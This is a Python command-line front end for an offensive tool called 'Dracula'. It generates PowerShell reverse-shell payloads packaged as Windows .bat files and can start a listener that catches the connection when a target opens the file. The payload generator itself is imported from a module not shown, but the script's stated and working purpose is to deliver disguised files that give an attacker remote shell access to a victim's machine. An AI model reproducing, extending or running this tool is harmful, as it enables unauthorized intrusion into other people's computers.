import os
import argparse
import Main.dracula_main as main

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print('\n')
    banner = [
        "     _____                       _       ",
        "    |  __ \\                     | |      ",
        "    | |  | |_.__ __._  ___._   _| | __._ ",
        "    | |  | |  __/ _  |/ __| | | | |/ _  |",
        "    | |__| | | | (_| | (__| |_| | | (_| |",
        "    |_____/|_|  \\__._|\\___|\\__._|_|\\__._|"
    ]
    colors = [57, 63, 69, 75, 81, 87]
    for i, line in enumerate(banner):
        txt_color = colors[i % len(colors)]
        print(''.join(f'\033[38;5;{txt_color}m{char}' for char in line))
    print("[-] Developed by ch37\n\033[0m[-] Use -h for help")

clear_screen()
print_banner()

payload_type = None

while True:
    dracula_cm = input("\033[38;5;57mDracula >> \033[0m ").split()
    if not dracula_cm:
        continue
    
    
    parser = argparse.ArgumentParser(description="Generate a reverse shell payload in form of a batch file.")
    parser.add_argument("-PORT", "--port", help="Port number for the reverse shell")
    parser.add_argument("-OUTFILE", "--output", help="Output file name")
    parser.add_argument("-CONNECT", "--connect", action="store_true", help="Connects with the target if the target opens the file")
    parser.add_argument("-IP", "--ip", help="Specify the IP address of the target")

    args = parser.parse_args(dracula_cm)
    powershell_script = main.generate_payload_ps(args.ip, args.port, args.output)
    try:
        with open(args.output + ".bat", "w") as f:
            f.write(powershell_script)
            print(f"\n\033[38;5;69mSUCCESS!!! \033[0mCREATED {args.output}.bat ")
    except Exception as e:
            print(f"\033[38;5;31mAn error occurred: {e}")
            

    if args.connect and args.port and args.ip:
        print(f"Starting listener on {args.ip}:{args.port}...")
        main.listener(args.ip, args.port)